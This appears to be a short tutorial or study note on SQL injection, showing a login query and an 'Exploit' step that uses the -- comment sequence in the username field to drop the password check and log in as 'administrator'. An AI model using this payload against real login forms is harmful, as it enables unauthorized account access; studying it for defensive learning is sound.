--- ---

<h2>Subverting Application logic</h2>

Consider an application that lets users log in with a username and password. If a user submits the
username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Exploit
1. Log in as any user with SQL comment sequence -- to remove password from the WHERE clause

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```